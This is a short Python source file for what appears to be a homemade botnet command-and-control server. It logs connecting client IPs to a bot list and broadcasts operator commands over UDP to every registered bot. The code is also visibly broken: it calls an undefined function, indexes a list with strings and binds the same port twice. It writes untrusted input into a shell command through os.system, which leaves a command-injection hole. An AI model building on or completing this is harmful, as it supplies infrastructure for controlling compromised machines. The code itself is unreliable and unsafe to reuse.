# AppLayer Protocol for commands <Op Code><data><data>
# Wait for incoming TCP connections

# WHEN CONNECTED
# Check SRC IP
# create ID and store data in textfile
# keep connection idle
from multiprocessing.connection import Listener
import socket
import os

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
MAX_CLIENTS = 10    # Maximum number of simultaneous clients

Shell_Port = 5000  # Shell CLI port
serv = Listener(('', Shell_Port))

IP_address_list = [1024]
BotListPath = './BotList.txt'


def getBotList(path):
    with open(path) as f:
        for line in f:
            data = line.split(',')
            if(len(data) is 2):
                IP_address_list[data[0]] = data[1]
            else:
                print("Line in Botlist.txt is empty")


def addBot(ip_addr):
    IP_address_list.append(ip_addr)
    index = index(ip_addr)
    os.system(f'echo {index},{ip_addr} >> {BotListPath}\n')


# Set up the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind((HOST, PORT))
getBotList(BotListPath)

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    s.bind((HOST, PORT))
    while True:
        command = serv.accept().recv()
        data, addr = s.recvfrom(1024)
        if addr in IP_address_list:
            continue
        else:
            addBot(addr)
            getBotList(BotListPath)

        if(command):
            for ip in IP_address_list:
                s.sendto(command.encode('utf-8'), (ip, 65432))
        else:
            continue
